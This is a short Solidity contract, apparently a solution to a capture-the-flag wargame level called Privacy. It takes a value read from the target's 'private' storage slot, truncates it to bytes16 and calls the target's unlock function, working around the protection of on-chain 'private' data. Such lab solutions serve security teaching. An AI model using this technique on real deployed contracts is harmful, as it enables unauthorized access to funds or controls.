// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './privacy.sol';

contract PrivacyAttack {
Privacy target;

constructor(address _target) public{
    target = Privacy(_target);
}

function unlock(bytes32 _slotValue) public {
    bytes16 key = bytes16(_slotValue); //conversion because bytes32[3] private data; but unlock want bytes16
    target.unlock(key);
}
    
}